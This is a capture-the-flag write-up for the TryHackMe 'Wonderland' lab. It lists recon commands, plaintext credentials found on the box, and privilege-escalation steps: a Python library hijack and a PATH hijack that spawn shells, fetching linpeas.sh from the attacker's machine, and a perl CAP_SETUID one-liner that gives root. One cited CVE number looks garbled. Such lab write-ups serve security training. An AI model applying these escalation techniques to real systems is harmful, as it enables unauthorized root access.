# [THM] Wonderland

## recon

- [nmap scan](./nmap.log)
	- cmd:`nmap -sC -sV -A -o nmap.log 10.10.72.185`
	- p22 & p80 are open

- [gobuster scan](./gobuster.log): 
	- cmd:`gobuster dir -u http://10.10.72.185/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log`
	- found a subdirectory `/r`, after gobuster scanning this found `/a`
		- like this found `<ip>/r/a/b/b/i/t/`
	- found `/img`, contains 3 images
		- found `hint.txt` by `steghide extract -sf white_rabbit_1.jpg`

- found `alice:HowDothTheLittleCrocodileImproveHisShiningTail` on `view-source:http://10.10.72.185/r/a/b/b/i/t/`
- `sudo -l` > `(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
	- py file _imports random library_ (do library hijacking)
	- create `random.py` (code: `import os \n os.system("/bin/bash")`)
- `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py` & now we are __rabbit__ user

- found `teaParty` in `/home/rabbit`
		- start python server `python3 -m http.server`
		- download it `wget http://10.10.72.185:8000/teaParty`

- `strings teaParty` 
	- found ``
	- create `nano date`, containing `#!/bin/bash \n /bin/bash`
	- now `chmod +x date` > `export PATH=/home/rabbit:$PATH` > `echo $PATH` > `./teaParty`
	- now we are __hatter__ user

- found `password.txt` on `/home/hatter` saying `WhyIsARavenLikeAWritingDesk?` (user _hatter_'s pwd > do `su hatter`)
- uploaded `linpeas.sh` to target machine
	- `python -m http.server`
	- `wget http://10.18.116.142:8000/linpeas.sh`
- same way uploaded `LinEnum.sh`

- [linpeas.sh](./linpeas.log) & [LinEnum.sh](./LinEnum.log) outputs

- __linpeas__ show _sudo version 1.8.21p2_ is vulnerable to _CVE-2021-403_ (nothing happens)
- it shows that _perl CAP_SETUID_ is vuln > use gtfobins (perl: capblities)
	- type `/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
	- got root!
